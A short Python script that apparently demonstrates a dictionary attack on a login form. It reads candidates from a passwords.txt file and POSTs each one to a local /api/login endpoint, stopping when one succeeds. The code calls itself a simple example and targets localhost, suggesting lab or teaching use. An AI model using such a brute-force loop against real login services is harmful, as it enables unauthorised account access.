# coding: utf-8
import requests
from sys import stdout
import time


def load_passwords():
    with open('passwords.txt', 'r') as f:
        passwords = f.read().splitlines()
    return passwords


# I know... it's not the best way to do it, but it's just a simple example
def main():
    passwords = load_passwords()

    for password in passwords:
        try:
            response = requests.post('http://localhost:3000/api/login',
                                     json={'password': password})

            if response.status_code == 200:
                print(u"✅ Found password: {password}".format(
                    password=password))
                break
            else:
                print(u"❌ Missed: {password}\r".format(password=password).format(
                    password=password))
                continue
        except:
            print(u"❌ Missed: {password}\r".format(password=password).format(
                password=password))
            continue


if __name__ == '__main__':
    main()
